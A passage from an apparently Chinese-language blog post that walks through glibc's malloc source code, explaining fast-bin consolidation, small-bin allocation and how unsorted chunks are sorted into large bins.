class="line"></span><br><span class="line">      <span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">        nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">          size += nextsize;</span><br><span class="line">          unlink(av, nextchunk, bck, fwd);</span><br><span class="line">        &#125; <span class="keyword">else</span></span><br><span class="line">          clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        first_unsorted = unsorted_bin-&gt;fd;</span><br><span class="line">        unsorted_bin-&gt;fd = p;</span><br><span class="line">        first_unsorted-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range (size)) &#123;</span><br><span class="line">          p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">          p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        set_head(p, size | PREV_INUSE);</span><br><span class="line">        p-&gt;bk = unsorted_bin;</span><br><span class="line">        p-&gt;fd = first_unsorted;</span><br><span class="line">        set_foot(p, size);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        size += nextsize;</span><br><span class="line">        set_head(p, size | PREV_INUSE);</span><br><span class="line">        av-&gt;top = p;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">while</span> ( (p = nextp) != <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (fb++ != maxfb);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    malloc_init_state(av);</span><br><span class="line">    check_malloc_state(av);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大致意思就是清空所有<code>arena</code>的<code>chunk</code>，可以看到大的<code>if</code>是判断<code>global_max_fast</code>是否为0，为0则初始化，调用<code>malloc_init_state</code>和<code>check_malloc_state</code>函数初始化堆。否则把所有的<code>fast bin</code> 取出来，先清除它们的标志位，然后扔到<code>unsorted bin</code>中尝试向前合并或者向后合并。</p><p>这个呢，不太能运行到，因为<code>victim==0</code>的时候，必还没初始化，没初始化到这里就要初始化，初始化了之后<code>victim</code>又不可能<code>=0</code>了，所以这里可以理解为就是初始化<code>arena</code>的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_inuse_bit_at_offset(p, s)                          \</span></span><br><span class="line"><span class="meta">  (((mchunkptr) (((char *) (p)) + (s)))-&gt;size |= PREV_INUSE)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunk2mem(p)   ((void*)((char*)(p) + 2*SIZE_SZ))</span></span><br><span class="line">bck = victim-&gt;bk;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">&#123;</span><br><span class="line">    errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br><span class="line">set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">bin-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">check_malloced_chunk (av, victim, nb);</span><br><span class="line"><span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">alloc_perturb (p, bytes);</span><br><span class="line"><span class="keyword">return</span> p;</span><br></pre></td></tr></table></figure><p>这里判断了一下<code>victim-&gt;bk-&gt;fd==victim</code>。也就是当前这个堆块后一个堆块的<code>fd</code>指针是否指向<code>victim</code>，如果不等说明链表被破坏了，那么就报错退出。</p><p>然后<code>set_inuse_bit_at_offset</code>，这个也不难理解，因为现在这个<code>small bin</code>被取出来了要使用了，所以我得设置后一个块的<code>prev_inuse</code>为1证明它不是空闲堆块了。然后就是进行<code>unlink</code>操作，对链表熟悉的同学应该看得懂。如果我要删除<code>victim</code>元素那应该怎么写逻辑？</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">victim-&gt;fd-&gt;bk=victim-&gt;bk;</span><br><span class="line">victime-&gt;bk-&gt;fd=victim-&gt;fd;</span><br></pre></td></tr></table></figure><p>在这里呢，我们取链的最后一个<code>chunk</code>，也就是<code>bin-&gt;bk=victim</code>所以<code>victim-&gt;fd=bin</code></p><p>然后前面有一个赋值就是<code>bck=victim-&gt;bk</code>。带进上面的式子就得到了源码里面这样的写法。</p><p>然后下面设置<code>main_arena</code>标志位，一波同样的<code>check</code>，然后返回内存指针。也就是这里的<code>chunk2mem</code>，我们这里用的<code>chunk</code>指针，但是其实我们要返回的应该是<code>chunk</code>中数据域的指针，所以这里用了这样的宏定义做替换。</p><p>然后就是清除<code>data</code>数据，但是这个一般不会被执行，前面也分析过了，然后返回。这是<code>small bin</code>找到对应的<code>chunk</code>的逻辑，如果<code>small bin</code>还没找到那么接下来应该要去找<code>large bin</code>了，那么我们接着往下读。</p><h3 id="第四段：分配largebin时的操作"><a href="#第四段：分配largebin时的操作" class="headerlink" title="第四段：分配largebin时的操作"></a>第四段：分配largebin时的操作</h3><p>那么如果没有在small bin的范围内呢。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    idx = largebin_index (nb);</span><br><span class="line">    <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">        malloc_consolidate (av);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一步比较耐人寻味。</p><p>先获取<code>large bin</code>的<code>index</code>，然后如果<code>fast bin</code>不为空，调用<code>malloc_consolidate</code>。这一步是什么意思呢？我们前面分析过<code>malloc_consolidate</code>，如果没有初始化，那么初始化，如果初始化了，那么合并所有的<code>fast bin</code>。但是这里，都已经有<code>fast bin</code>存在了，那么堆指定已经初始化了，所以这里执行的逻辑基本只能是合并所有<code>fast chunk</code>。为什么要在搜索<code>large bin</code>的时候合并所有<code>fast bin</code>呢？因为<code>large bin</code>的匹配方式是最小能满足，然后切割。</p><p>考虑这样一种情况：</p><p>如果一个<code>0x20</code>的<code>fast bin</code>和0x500的<code>large bin</code>物理相邻。此时我要申请一个<code>0x510</code>的<code>large bin</code>，如果此时<code>fast bin</code>被合并了，那么我就能找到一个<code>0x520</code>的<code>large bin</code>并把它返回给用户。如果我不做这一步，那么我找不到<code>0x510</code>大小的<code>large bin</code>，我就被迫只能切割<code>top_chunk</code>了，这样子就浪费了很大的一块内存。</p><p>那么这个会不会有多此一举的时候呢，也是会的，还是刚刚那种情况，假如我申请<code>0x500</code>的<code>chunk</code>。这样子合并之后又会被切割，那么这样子，之前的合并就显得多次一举了，但是它只是浪费了一部分时间开销，内存分配上还是执行上面的逻辑比较占优势。所以这一步可以理解为空间上的优化，但是牺牲了小部分时间。看不来的话可以多看看上面举得例子。</p><h3 id="第五段：large-bin和unsorted-bin的相爱相杀"><a href="#第五段：large-bin和unsorted-bin的相爱相杀" class="headerlink" title="第五段：large bin和unsorted bin的相爱相杀"></a>第五段：large bin和unsorted bin的相爱相杀</h3><p>这里开始逻辑都混合起来了，不仅有<code>large bin</code>，unsorted bin，切割<code>top_chunk</code>，还有系统调用重新分配<code>top_chunk</code>。</p><h4 id="第1小块"><a href="#第1小块" class="headerlink" title="第1小块"></a>第1小块</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (;; )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">int</span> iters = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">          <span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">              || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">            malloc_printerr (check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>,</span><br><span class="line">                             chunk2mem (victim), av);</span><br><span class="line">          size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/*</span></span><br><span class="line"><span class="comment">             If a small request, try to use last remainder if it is the</span></span><br><span class="line"><span class="comment">             only chunk in unsorted bin.  This helps promote locality for</span></span><br><span class="line"><span class="comment">             runs of consecutive small requests. This is the only</span></span><br><span class="line"><span class="comment">             exception to best-fit, and applies only when there is</span></span><br><span class="line"><span class="comment">             no exact fit for a small chunk.</span></span><br><span class="line"><span class="comment">           */</span></span><br><span class="line">           ......</span><br><span class="line">         &#125;</span><br><span class="line">    ......</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>首先外面套了一个<code>while(1)</code>，然后里面有一个<code>while</code>循环，判断内容就是取得最后一个<code>unsorted chunk</code>是否与这个<code>bin</code>相等，这里大概就是开始遍历<code>unsorted chunk</code>了。</p><p>然后这里又有一个<code>check</code>。<code>victim-&gt;size &lt;= 2 * SIZE_SZ</code>就是说<code>chunk</code>的<code>size</code>小于等于<code>0x10</code>，<code>victim-&gt;size &gt; av-&gt;system_mem</code>就是说我一个块的<code>size</code>居然比我系统调用申请来的内存都多，那这肯定不合理啊，所以任意满足一个就会报错了。</p><h4 id="第二小块"><a href="#第二小块" class="headerlink" title="第二小块"></a>第二小块</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp;</span><br><span class="line">bck == unsorted_chunks (av) &amp;&amp;</span><br><span class="line">victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* split and reattach remainder */</span></span><br><span class="line">    remainder_size = size - nb;</span><br><span class="line">    remainder = chunk_at_offset (victim, nb);</span><br><span class="line">    unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;</span><br><span class="line">    av-&gt;last_remainder = remainder;</span><br><span class="line">    remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);</span><br><span class="line">    <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">    &#123;</span><br><span class="line">        remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">        remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    set_head (victim, nb | PREV_INUSE |</span><br><span class="line">    (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">    set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">    set_foot (remainder, remainder_size);</span><br><span class="line"></span><br><span class="line">    check_malloced_chunk (av, victim, nb);</span><br><span class="line">    <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">    alloc_perturb (p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有四个条件：</p><ol><li><code>in_smallbin_range (nb)</code>：申请<code>small bin</code>范围内的<code>chunk</code></li><li><code>bck == unsorted_chunks (av)</code>：<code>bck=victim-&gt;bk=unsorted_chunks(av)-&gt;bk-&gt;bk</code>，也就是说<code>unsorted_chunks (av)-&gt;bk-&gt;bk=unsorted_chunks (av)</code>，翻译一下差不多就是<code>unsorted bin中</code>只有一个<code>chunk</code>。</li><li><code>victim == av-&gt;last_remainder</code>：就是说这个chunk刚好是最近被分割过的剩余部分。</li><li><code>(unsigned long) (size) &gt; (unsigned long) (nb + MINSIZE))</code>：保证我找到的这个<code>chunksize</code> &gt; 需要的最小块+<code>MINSIZE</code>。为了保证等会我切割出<code>nb size</code>之后剩余的<code>chunk</code>能&gt;<code>MINSIZE</code>，这里我也不知道为什么不能等于，可能解读哪里有误吧，如果您知道请帮我勘误一下，谢谢了。</li></ol><p>然后接下来就是切割<code>victim</code>，切割出一块刚刚好大小的<code>chunk</code>给用户，切割出来的<code>chunk</code>作为新的<code>av-&gt;last_remainder</code>，注意如果切割剩余的<code>chunk size</code>不符合<code>small bin</code>的大小，则<code>fd_nextsize</code>和<code>bk_nextisze</code>会被清空，因为剩余的的<code>chunk</code>会被放到<code>unsorted bin</code>当中。</p><p>然后设置<code>victim</code>的<code>size</code>为<code>nb|PREV_INUSE</code>，然后判断是否为主分配加上标记。</p><p>然后把remainder的<code>prev_inuse</code>位设置为1，因为前一个块已经被拿走使用了，所以这个<code>prev_inuse</code>要设置为1。</p><p>然后因为<code>remainder</code>的<code>size</code>发生了改表，所以下一个<code>chunk</code>的<code>prev_size</code>也要相应地改变。</p><p>剩下的前面类似的都讲过就不赘述了。</p><h4 id="第三小块"><a href="#第三小块" class="headerlink" title="第三小块"></a>第三小块</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Take now instead of binning if exact fit */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (size == nb)</span><br><span class="line">&#123;</span><br><span class="line">    set_inuse_bit_at_offset (victim, size);</span><br><span class="line">    <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">        victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">    check_malloced_chunk (av, victim, nb);</span><br><span class="line">    <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">    alloc_perturb (p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* place chunk in bin */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (in_smallbin_range (size))</span><br><span class="line">&#123;</span><br><span class="line">    victim_index = smallbin_index (size);</span><br><span class="line">    bck = bin_at (av, victim_index);</span><br><span class="line">    fwd = bck-&gt;fd;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>否则会先取出这最后一个<code>chunk</code>，把它移除<code>unsorted bin</code>。如果取出的这个<code>size</code>刚好等于这个<code>nb</code>，那就说明这个块一定是最合适的，直接把它返回了，不要迟疑。如果并不是最合适呢，那么先会判断一下它是否属于<code>small bin</code>，属于则执行以下的逻辑，把<code>bck</code>对应<code>bin</code>的<code>bk</code>，<code>fwd</code>为对应<code>bin</code>的<code>fd</code>，也就是找到那一对<code>bin</code>，<code>fwd</code>在前，<code>bck</code>在后。就没了，预计等会就要用这些指针把<code>chunk</code>链进去了。</p><h4 id="第四小块"><a href="#第四小块" class="headerlink" title="第四小块"></a>第四小块</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    victim_index = largebin_index (size);</span><br><span class="line">    bck = bin_at (av, victim_index);</span><br><span class="line">    fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">    <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">        size |= PREV_INUSE;</span><br><span class="line">        <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">        assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (bck-&gt;bk-&gt;size))</span><br><span class="line">        &#123;</span><br><span class="line">            fwd = bck;</span><br><span class="line">            bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">            victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">            victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">            fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">while</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size &lt; fwd-&gt;size)</span><br><span class="line">            &#123;</span><br><span class="line">                fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">                assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size == (<span class="keyword">unsigned</span> <span class="keyword">long</span>) fwd-&gt;size)</span><br><span class="line">                <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                fwd = fwd-&gt;fd;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">            &#125;</span><br><span class="line">            bck = fwd-&gt;bk;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果不是<code>small bin</code>，那就得进<code>large bin</code>了，要进<code>large bin</code>。这里要知道，<code>large bin</code>可是所有<code>bin</code>当中最复杂的<code>bin</code>了，一个<code>chunk</code>四个指针，一对<code>bin</code>管理一个二维双向链表，<code>fd</code>,<code>bk</code>指针与相同大小的<code>chunk</code>连接，<code>fd_nextsize</code>和<code>bk_nextsize</code>与不同大小的<code>chunk</code>连接。</p><p>然后呢，虽然<code>fd</code>和<code>bk</code>是连接相同大小的<code>chunk</code>，但是那一对bin还是相当于是<code>fd</code>和<code>bk</code>字段。除了表头以外，其余的不同大小的chunk都是靠<code>fd_nextsize</code>和<code>bk_nextsize</code>的。并且沿着<code>bk_nextsize</code>，<code>chunksize</code>递增。也就是说<code>av-&gt;bin[index]-&gt;bk</code>是第一个<code>chunk</code>，并且<code>size</code> 最小，然后通过<code>bk_nextsize</code>字段一直连接到<code>av-&gt;bin[index]-&gt;fd</code>，反向同理。还有一点需要注意：<code>large bin</code>所在的<code>chunk</code>并不与<code>chunk</code>双向连接。</p><p>这里给出一张<code>large bin</code>的结构图，看看能不能帮助理解一下</p><p><img src="/2022/01/27/malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/2.png" alt="2"></p><p>那么这里的<code>bck</code>指的是<code>bin</code>所在的<code>chunk</code>，<code>fwd</code>指的是最大的这个<code>chunk</code>。</p><p><code>bck-&gt;bk</code>指的就是图上的n号<code>chunk</code>，也是这个<code>large bin</code>中最小的那个<code>chunk</code>，如果拿出来的<code>unsorted bin</code>它比最小的<code>chunk</code>还要小，那就已经可以确定插入在哪了，就不用做下面的循环再看看它在哪了。然后就是一个链表的插入操作，这里要注意的是，<code>bin</code>所在的<code>chunk</code>只有<code>fd</code>和bk指针，而其它<code>chunk</code>都是<code>fd_nextsize</code>和<code>bk_nextsize</code>连接的。我们只需要先在最大块和最小块之间插入，然后把<code>bin-&gt;bk</code>指向<code>victim</code>即可。</p><p>那么我们大概自己写一下操作看看与源码是否一致。首先不考虑bin，只考虑链表的情况下，我们先找到最大块和最小块。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fwd=bin-&gt;fd;</span><br><span class="line">bck=bin-&gt;bk;</span><br><span class="line">victim-&gt;bk_nextsize=bck;</span><br><span class="line">victim-&gt;fd_nextsize=fwd;</span><br><span class="line">fwd-&gt;bk_nextsize=bck-&gt;fd_nextsize=victim;</span><br></pre></td></tr></table></figure><p>跟上面大致一样，只不过它这里<code>fwd</code>的值是那个<code>large bin</code>的<code>chunk</code>，直接通过<code>fd</code>指针也能直接找到最大的<code>chunk</code>。所以我后面的主要代码应该把<code>fwd</code>改成<code>fwd-&gt;fd</code>就跟上面一模一样了。</p><p>如果不是，那就接着往<code>bk_nextsize</code>这个指针上面找，找到大于等于的<code>chunk</code>为止。然后如果等于，就只需要用<code>fd</code>和<code>bk</code>指针与相等大小的<code>chunk</code>相连，如果没有相等，就得在<code>fd_nextsize</code>和<code>bk_nextsize</code>方向上插入，然后<code>fd</code>和<code>bk</code>都默认指向自己。这个我就不演试了，跟前面那个基本是一样的。</p><h4 id="第五小块"><a href="#第五小块" class="headerlink" title="第五小块"></a>第五小块</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mark_bin (av, victim_index);</span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_ITERS       10000</span></span><br><span class="line"><span class="keyword">if</span> (++iters &gt;= MAX_ITERS)</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>这个就很简单了，就是一个插入操作，前面既然已经找到了插入的位置，这里一气呵成直接解决了。然后这里还有一个遍历<code>unsorted bin</code>的最大值，一次最多遍历<code>10000</code>个<code>unsorted bin</code>，这个也可以理解，如果我一次产生了很多的<code>unsorted bin</code>，然后我一次<code>malloc</code>，那边一直在循环搞这个<code>unsorted bin</code>，迟迟就没分配内存回来所以这里设定一个最大值。</p><p>到了这里，对<code>unsorted bin</code>的遍历就结束了。</p><h4 id="第六小块"><a href="#第六小块" class="headerlink" title="第六小块"></a>第六小块</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!in_smallbin_range (nb))</span><br><span class="line">&#123;</span><br><span class="line">    bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* skip scan if empty or largest chunk is too small */</span></span><br><span class="line">    <span class="keyword">if</span> ((victim = first (bin)) != bin &amp;&amp;</span><br><span class="line">        (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (victim-&gt;size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb))</span><br><span class="line">    &#123;</span><br><span class="line">        victim = victim-&gt;bk_nextsize;</span><br><span class="line">        <span class="keyword">while</span> (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size = chunksize (victim)) &lt;</span><br><span class="line">                (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb)))</span><br><span class="line">            victim = victim-&gt;bk_nextsize;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Avoid removing the first entry for a size so that the skip</span></span><br><span class="line"><span class="comment">                 list does not have to be rerouted.  */</span></span><br><span class="line">        <span class="keyword">if</span> (victim != last (bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size)</span><br><span class="line">            victim = victim-&gt;fd;</span><br><span class="line"></span><br><span class="line">        remainder_size = size - nb;</span><br><span class="line">        unlink (av, victim, bck, fwd);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Exhaust */</span></span><br><span class="line">        <span class="keyword">if</span> (remainder_size &lt; MINSIZE)</span><br><span class="line">        &#123;</span><br><span class="line">            set_inuse_bit_at_offset (victim, size);</span><br><span class="line">            <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* Split */</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            remainder = chunk_at_offset (victim, nb);</span><br><span class="line">            <span class="comment">/* We cannot assume the unsorted list is empty and 